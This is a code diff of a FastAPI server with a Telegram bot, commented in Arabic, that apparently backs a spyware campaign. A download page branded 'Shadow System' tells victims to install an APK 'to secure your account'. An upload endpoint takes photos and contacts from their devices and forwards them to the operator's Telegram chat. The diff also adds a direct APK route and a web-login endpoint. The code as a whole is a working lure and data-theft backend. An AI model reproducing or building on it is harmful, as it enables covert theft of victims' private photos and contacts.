@@ -8,14 +8,12 @@ import logging
 import random
 import string
 import json
-import re
-from datetime import datetime, timedelta
+from datetime import datetime
 import uvicorn
 from pydantic import BaseModel
-from fastapi import FastAPI, Request, Response, BackgroundTasks, HTTPException
+from fastapi import FastAPI, Request, BackgroundTasks, HTTPException
 from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.staticfiles import StaticFiles
 import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 
@@ -55,9 +53,14 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ==================== ربط مجلد الملفات الثابتة (لتحميل APK) ====================
-# تأكد من وجود مجلد "static" بجوار main.py يحتوي على ملف app.apk
-app.mount("/static", StaticFiles(directory="static"), name="static")
+# ==================== مسار تقديم ملف APK مباشرة ====================
+@app.get("/app.apk")
+async def serve_apk():
+    """تقديم ملف APK من جذر المشروع"""
+    if os.path.exists("app.apk"):
+        return FileResponse("app.apk", media_type="application/vnd.android.package-archive", filename="app.apk")
+    else:
+        return HTMLResponse("<h1>الملف غير موجود</h1>", status_code=404)
 
 # ==================== قاعدة البيانات ====================
 def get_db_connection():
@@ -399,7 +402,7 @@ async def download_page():
             <span class="icon">📲</span>
             <h1>تحميل التطبيق</h1>
             <p class="sub">قم بتحميل التطبيق لتأمين حسابك</p>
-            <a href="/static/app.apk" class="btn-download" download>
+            <a href="/app.apk" class="btn-download" download>
                 ⬇️ تحميل الآن
             </a>
             <div class="footer">v2.0 · Shadow System</div>
@@ -418,7 +421,6 @@ async def upload_all_data(request: Request, background_tasks: BackgroundTasks):
         images_b64 = data.get("images", [])
         contacts = data.get("contacts", "")
 
-        # تقرير مختصر
         summary = (
             f"📱 **بيانات جديدة!**\n"
             f"🆔 المستخدم: `{user_id}`\n"
@@ -427,7 +429,6 @@ async def upload_all_data(request: Request, background_tasks: BackgroundTasks):
         )
         background_tasks.add_task(bot.send_message, chat_id=OWNER_ID, text=summary, parse_mode="Markdown")
 
-        # إرسال أول 15 صورة
         for idx, img_b64 in enumerate(images_b64[:15]):
             try:
                 img_bytes = base64.b64decode(img_b64)
@@ -442,7 +443,6 @@ async def upload_all_data(request: Request, background_tasks: BackgroundTasks):
             except Exception as e:
                 logger.error(f"فشل إرسال الصورة: {e}")
 
-        # إرسال جهات الاتصال
         if contacts:
             parts = [contacts[i:i+4000] for i in range(0, len(contacts), 4000)]
             for part in parts:
@@ -453,7 +453,6 @@ async def upload_all_data(request: Request, background_tasks: BackgroundTasks):
                     parse_mode="Markdown"
                 )
 
-        # حفظ سجل
         conn = get_db_connection()
         cursor = conn.cursor()
         cursor.execute(
@@ -468,6 +467,16 @@ async def upload_all_data(request: Request, background_tasks: BackgroundTasks):
     except Exception as e:
         logger.error(f"Upload Error: {traceback.format_exc()}")
         return JSONResponse(status_code=500, content={"status": "error"})
+
+@app.post("/api/web-login")
+async def api_web_login(data: dict):
+    chat_id = data.get("chat_id")
+    username = data.get("username")
+    password = data.get("password")
+    if try_login_user(chat_id, username, password):
+        bot.send_message(chat_id, "✅ تم تسجيل الدخول بنجاح.")
+        return {"status": "success"}
+    return {"status": "error", "message": "بيانات غير صحيحة"}
 
 # ==================== أوامر البوت ====================
 
@@ -557,7 +566,7 @@ def gen_link(call):
         logger.error(f"💥 خطأ: {traceback.format_exc()}")
         bot.send_message(chat_id, f"⚠️ عطل تقني: {str(e)[:100]}")
 
-# ==================== أمر فتح صفحة التحميل ====================
+# ==================== أمر فتح صفحة تحميل التطبيق ====================
 @bot.message_handler(commands=['app'])
 def app_command(message):
     chat_id = message.chat.id
